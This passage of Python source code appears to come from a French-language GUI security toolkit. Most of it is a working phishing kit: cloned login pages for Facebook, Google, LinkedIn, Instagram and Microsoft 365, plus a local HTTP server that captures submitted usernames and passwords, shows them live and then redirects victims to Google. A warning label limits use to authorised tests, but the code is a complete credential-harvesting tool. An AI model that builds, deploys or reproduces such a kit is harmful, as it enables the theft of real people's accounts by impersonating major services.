button:hover{background:#166fe5}
.line{border-top:1px solid #dadde1;margin:20px 0}
a{color:#1877f2;text-decoration:none;font-size:14px;display:block;margin-top:12px}
a:hover{text-decoration:underline}
</style></head><body>
<div class="card">
<div class="logo">facebook</div>
<form method="POST" action="/">
<input type="text" name="email" placeholder="Adresse email ou num\u00e9ro de t\u00e9l." required>
<input type="password" name="pass" placeholder="Mot de passe" required>
<button type="submit">Se connecter</button>
</form>
<div class="line"></div>
<a href="#">Mot de passe oubli\u00e9 ?</a>
</div></body></html>"""
    },
    "Google": {
        "title": "Google - Connexion",
        "logo": "🔑",
        "fields": ["email", "pass"],
        "html": """
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Google - Connexion</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Google Sans',Roboto,Arial,sans-serif}
body{background:#fff;display:flex;justify-content:center;align-items:center;height:100vh}
.card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px;width:450px;text-align:center}
.logo{font-size:32px;font-weight:400;margin-bottom:30px}
.logo span{color:#4285f4}span:nth-child(2){color:#ea4335}span:nth-child(3){color:#fbbc04}span:nth-child(4){color:#34a853}
h2{font-size:24px;font-weight:400;margin-bottom:8px}
p{color:#5f6368;font-size:14px;margin-bottom:30px}
input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:12px;outline:none}
input:focus{border-color:#4285f4}
button{background:#4285f4;color:#fff;border:none;border-radius:4px;padding:12px 24px;font-size:14px;font-weight:500;width:100%;cursor:pointer}
button:hover{background:#1a73e8}
.footer{margin-top:40px;font-size:12px;color:#5f6368}
</style></head><body>
<div class="card">
<div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
<h2>Connexion</h2>
<p>Utilisez votre compte Google</p>
<form method="POST" action="/">
<input type="text" name="email" placeholder="Adresse email" required>
<input type="password" name="pass" placeholder="Mot de passe" required>
<button type="submit">Suivant</button>
</form>
<div class="footer"><a href="#">Aide</a> &middot; <a href="#">Confidentialit\u00e9</a> &middot; <a href="#">Conditions</a></div>
</div></body></html>"""
    },
    "LinkedIn": {
        "title": "LinkedIn - Connexion",
        "logo": "🔗",
        "fields": ["email", "pass"],
        "html": """
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>LinkedIn - Connexion</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,system-ui,BlinkMacSystemFont,'Segoe UI',Roboto}
body{background:#f3f2ef;display:flex;justify-content:center;align-items:center;height:100vh}
.card{background:#fff;border-radius:8px;padding:24px;width:400px;text-align:center;box-shadow:0 4px 12px rgba(0,0,0,.08)}
.logo{color:#0a66c2;font-size:40px;font-weight:bold;margin-bottom:20px}
input{width:100%;padding:14px 12px;border:1px solid rgba(0,0,0,.15);border-radius:4px;font-size:16px;margin-bottom:12px;outline:none}
input:focus{border-color:#0a66c2}
button{background:#0a66c2;color:#fff;border:none;border-radius:24px;padding:12px 24px;font-size:16px;font-weight:600;width:100%;cursor:pointer}
button:hover{background:#004182}
.line{margin:16px 0;font-size:12px;color:rgba(0,0,0,.6)}
</style></head><body>
<div class="card">
<div class="logo">LinkedIn</div>
<form method="POST" action="/">
<input type="text" name="email" placeholder="Email ou t\u00e9l\u00e9phone" required>
<input type="password" name="pass" placeholder="Mot de passe" required>
<button type="submit">S\u2019identifier</button>
</form>
<div class="line">---</div>
</div></body></html>"""
    },
    "Instagram": {
        "title": "Instagram - Connexion",
        "logo": "📸",
        "fields": ["username", "password"],
        "html": """
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Instagram - Connexion</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto}
body{background:#fafafa;display:flex;justify-content:center;align-items:center;height:100vh}
.card{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px;width:350px;text-align:center}
.logo{font-family:'Billabong',cursive;font-size:50px;margin-bottom:30px}
input{width:100%;padding:9px 8px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;margin-bottom:6px;outline:none}
button{background:#0095f6;color:#fff;border:none;border-radius:8px;padding:8px 16px;font-size:14px;font-weight:600;width:100%;cursor:pointer;margin-top:8px}
button:hover{background:#1877f2}
.line{margin:20px 0;font-size:12px;color:#8e8e8e}
</style></head><body>
<div class="card">
<div class="logo">Instagram</div>
<form method="POST" action="/">
<input type="text" name="username" placeholder="Nom d'utilisateur" required>
<input type="password" name="password" placeholder="Mot de passe" required>
<button type="submit">Se connecter</button>
</form>
<div class="line">---</div>
</div></body></html>"""
    },
    "Microsoft 365": {
        "title": "Microsoft - Connexion",
        "logo": "🪟",
        "fields": ["login", "passwd"],
        "html": """
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Microsoft 365 - Connexion</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Roboto,Arial,sans-serif}
body{background:#f2f2f2;display:flex;justify-content:center;align-items:center;height:100vh}
.card{background:#fff;box-shadow:0 2px 6px rgba(0,0,0,.2);padding:44px;width:440px}
.logo{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:20px}
h2{font-size:24px;font-weight:600;margin-bottom:12px;color:#1b1b1b}
input{width:100%;padding:6px 10px;border:1px solid #666;border-radius:2px;font-size:15px;margin-bottom:16px;outline:none;height:36px}
input:focus{border-color:#0067b8}
button{background:#0067b8;color:#fff;border:none;padding:6px 20px;font-size:15px;cursor:pointer;float:right;min-width:108px;height:36px}
button:hover{background:#005da6}
.footer{clear:both;padding-top:40px;font-size:12px;color:#666}
</style></head><body>
<div class="card">
<div class="logo">Microsoft</div>
<h2>Se connecter</h2>
<form method="POST" action="/">
<input type="text" name="login" placeholder="Email, t\u00e9l\u00e9phone ou Skype" required>
<input type="password" name="passwd" placeholder="Mot de passe" required>
<button type="submit">Se connecter</button>
</form>
<div class="footer"><a href="#">Informations de connexion</a></div>
</div></body></html>"""
    },
}


class PhishingServer:
    def __init__(self, tab, port=8080):
        self.tab = tab
        self.port = port
        self.server = None
        self.thread = None

    def start(self, html, port):
        from http.server import HTTPServer, BaseHTTPRequestHandler

        class PhishHandler(BaseHTTPRequestHandler):
            def log_message(self, fmt, *args):
                pass

            def do_GET(self):
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.end_headers()
                self.wfile.write(html.encode())

            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length).decode()
                self.server.captured.append(body)
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.end_headers()
                self.wfile.write(b"<script>window.location.href='https://www.google.com';</script>")

        class PhishHTTPServer(HTTPServer):
            def __init__(self, *a, **kw):
                self.captured = []
                super().__init__(*a, **kw)
            def process_request(self, request, client_address):
                self.captured_data = self.captured
                super().process_request(request, client_address)

        self.server = PhishHTTPServer(("0.0.0.0", port), PhishHandler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        return True

    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()

    def get_captured(self):
        if self.server:
            return list(self.server.captured)
        return []


class PhishingTab(BaseTab):
    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.server = None
        self.build()

    def build(self):
        main = ttk.Frame(self.parent)
        main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        warn = ttk.LabelFrame(main, text="\u26a0 Avertissement")
        warn.pack(fill=tk.X, pady=(0, 6))
        ttk.Label(warn, text=(
            "Usage strictement r\u00e9serv\u00e9 aux tests d'intrusion autoris\u00e9s et campagnes "
            "de sensibilisation. L'utilisation non autoris\u00e9e est ill\u00e9gale."
        ), foreground="red", wraplength=780).pack(padx=10, pady=4)

        # ── Configuration ──
        cfg = ttk.LabelFrame(main, text="Configuration")
        cfg.pack(fill=tk.X, pady=(0, 6))

        ttk.Label(cfg, text="Template:").grid(row=0, column=0, padx=5, pady=4, sticky="w")
        self.template_var = tk.StringVar(value="Facebook")
        ttk.Combobox(cfg, textvariable=self.template_var,
                     values=list(PHISHING_TEMPLATES.keys()), width=20, state="readonly"
                     ).grid(row=0, column=1, padx=5, pady=4, sticky="w")

        ttk.Label(cfg, text="Port:").grid(row=0, column=2, padx=5, pady=4, sticky="w")
        self.entry_port = ttk.Spinbox(cfg, from_=1024, to=65535, width=6, value=8080)
        self.entry_port.grid(row=0, column=3, padx=5, pady=4, sticky="w")

        ttk.Label(cfg, text="URL locale:").grid(row=0, column=4, padx=5, pady=4, sticky="w")
        self.lbl_url = ttk.Label(cfg, text="http://localhost:8080", font=("TkDefaultFont", 10, "bold"), foreground="blue")
        self.lbl_url.grid(row=0, column=5, padx=5, pady=4, sticky="w")

        # ── Control ──
        ctrl = ttk.Frame(cfg)
        ctrl.grid(row=1, column=0, columnspan=6, pady=6)
        self.btn_start = ttk.Button(ctrl, text="D\u00e9marrer le serveur", command=self.run_start, width=22)
        self.btn_start.pack(side=tk.LEFT, padx=5)
        self.btn_stop = ttk.Button(ctrl, text="Arr\u00eater", command=self.stop_server, width=15, state=tk.DISABLED)
        self.btn_stop.pack(side=tk.LEFT, padx=5)
        self.lbl_status = ttk.Label(ctrl, text="\u25cf Arr\u00eat\u00e9", foreground="red", font=("TkDefaultFont", 10, "bold"))
        self.lbl_status.pack(side=tk.LEFT, padx=10)

        # ── Captured Log ──
        log_frame = ttk.LabelFrame(main, text="Identifiants captur\u00e9s (en temps r\u00e9el)")
        log_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 6))
        self.log_text = scrolledtext.ScrolledText(log_frame, height=10, font=("Consolas", 9), state="normal")
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=8, pady=8)
        self.log_text.tag_config("cred", foreground="green", font=("Consolas", 9, "bold"))

        # ── Preview ──
        self.output = self.make_output(main)

    def run_start(self):
        port = int(self.entry_port.get())
        template = self.template_var.get()
        data = PHISHING_TEMPLATES.get(template)
        if not data:
            messagebox.showerror("Erreur", "Template inconnu.")
            return
        self.clear(self.log_text)
        self.log_text.insert(tk.END, f"[*] Serveur phishing d\u00e9marr\u00e9 sur le port {port}\n")
        self.log_text.insert(tk.END, f"[*] Template: {template}\n")
        self.log_text.insert(tk.END, f"[*] URL: http://0.0.0.0:{port}\n")
        self.log_text.insert(tk.END, f"[*] URL locale: http://localhost:{port}\n")
        self.log_text.insert(tk.END, "-" * 50 + "\n")

        self.server = PhishingServer(self, port)
        html = data["html"]
        self.server.start(html, port)
        self.lbl_url.config(text=f"http://localhost:{port}")
        self.btn_start.config(state=tk.DISABLED)
        self.btn_stop.config(state=tk.NORMAL)
        self.lbl_status.config(text="\u25cf En \u00e9coute", foreground="green")

        local_ip = self._get_local_ip()
        self.log(self.output, f"Serveur phishing d\u00e9marr\u00e9 sur 0.0.0.0:{port}", "bold")
        self.log(self.output, f"URL locale: http://localhost:{port}", "success")
        self.log(self.output, f"URL r\u00e9seau: http://{local_ip}:{port}", "success")
        self.log(self.output, f"Template: {template}")
        self.log(self.output, "En attente des identifiants...\n", "bold")

        self.run_thread(lambda: self._poll_captured())

    def _poll_captured(self):
        seen = set()
        srv = self.server
        while srv and srv.server:
            time.sleep(1)
            try:
                for item in srv.get_captured():
                    if item not in seen:
                        seen.add(item)
                        self.app.after(0, lambda i=item: self._display_captured(i))
            except:
                break

    def _display_captured(self, item):
        from urllib.parse import unquote
        parts = item.split("&")
        self.log_text.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] Nouveau!\n", "cred")
        for p in parts:
            if "=" in p:
                k, v = p.split("=", 1)
                v = unquote(v)
                self.log_text.insert(tk.END, f"  {k}: {v}\n", "cred")
        self.log_text.insert(tk.END, "-" * 50 + "\n")
        self.log_text.see(tk.END)
        self.log(self.output, "Identifiants captur\u00e9s !", "success")

    def _get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def stop_server(self):
        if self.server:
            self.server.stop()
            self.server = None
        self.btn_start.config(state=tk.NORMAL)
        self.btn_stop.config(state=tk.DISABLED)
        self.lbl_status.config(text="\u25cf Arr\u00eat\u00e9", foreground="red")
        self.log(self.output, "Serveur arr\u00eat\u00e9.", "warning")


# ════════════════════════ MAIN ════════════════════════
def main():
    app = CyberAI()
    app.mainloop()


if __name__ == "__main__":
    main()
